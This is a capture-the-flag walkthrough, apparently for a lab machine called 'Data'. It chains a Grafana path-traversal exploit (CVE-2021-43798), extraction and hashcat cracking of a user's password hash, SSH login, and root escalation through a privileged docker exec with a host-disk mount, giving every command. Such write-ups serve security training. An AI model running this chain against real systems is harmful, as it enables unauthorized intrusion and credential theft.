
![[Data logo.png]]


nmap scan

```
nmap -sVC 10.129.1.116 -oN scan.txt
```

```
<SNIP>

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 63470a81ad0f7807464b15524a4d1e39 (RSA)
|   256 7da9acfa01e8dd09904048ecddf308be (ECDSA)
|_  256 91332d1a81871a84d3b90b23233d194b (ED25519)
3000/tcp open  ppp?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache

<SNIP>
```

We only have 2 ports, nothing to do with ssh, so i went directly to port 3000

![Pasted image 20251202183719](Images/Pasted%20image%2020251202183719.png)
So we land on a grafana login page, i tried the default cred but it didn't work so i searched for some exploit online.

I found the **CVE-2021-43798** which allow me to do directory traversal path.

I found that poc on github which helped me to exploit the vuln 
https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798

So i cloned it to my machine

```
git clone https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798
```
```
pip3 install -r requirement.txt
```

And run the exploit

```
python3 exploit.py
```

![Pasted image 20251202192229](Images/Pasted%20image%2020251202192229.png)

The exploit was successful and i got an interesting file, grafana.db

I opened the file with sqlite3 and i extracted the user table

```
sqlite3 grafana.db
```

```
sqlite> select name,password,salt from user where name = "boris";
```

```
boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl
```

That is the part i got stuck a bit of time. In order to crack the hash, you have to combine it to a format hashcat will understand. After some research i found a github page that convert grafana hashes to **PBKDF2_HMAC_SHA256**.

So i cloned the repo to my machine

```
git clone https://github.com/iamaldi/grafana2hashcat
```
Next i created a hash.txt file with the hash + salt inside (with a format that the tool will understand)

```
echo 'dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8,LCBhdtJWjl' > hash.txt
```
And i converted the hash 

```
python3 grafana2hashcat.py hash.txt
```
![Pasted image 20251202193819](Images/Pasted%20image%2020251202193819.png)

Now i can crack the hash using hashcat

```
hashcat -m 10900 hash.txt `fzf-wordlists`
```

```
<SNIP>

Dictionary cache hit:
* Filename..: /opt/lists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)

<SNIP>
```

So the password for `boris` is `beautiful1`

I tried those creds with ssh and it worked so i grabbed the user.txt

![Pasted image 20251202194104](Images/Pasted%20image%2020251202194104.png)

## Privesc

First thing i did was to run the `sudo -l` command to see what commands i can run using sudo

```
boris@data:/opt$ sudo -l
Matching Defaults entries for boris on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *
```

Ok i can run that specific command using sudo, so now i listed every mounted directory n the target.

```
boris@data:/opt$ mount
<SNIP>
/dev/sda1 on / type ext4 (rw,relatime)
<SNIP>
```

And i found out that this device was mounted to / on the target.
Using this knowledge, i had to find the conteiner id of the docker instance to get a shell as root and then mount the device in order to get complete acces to the file of the target.

Using `ps aux` i found the id `e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81`

Now we can try the attack

```
sudo /snap/bin/docker exec -it --user root --privileged e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 /bin/bash
```

Now that we are root on the docker, we can mount the device

```
mount /dev/sda1 /mnt
```

![Pasted image 20251202201152](Images/Pasted%20image%2020251202201152.png)

And we get the root flag, which complete the challenge
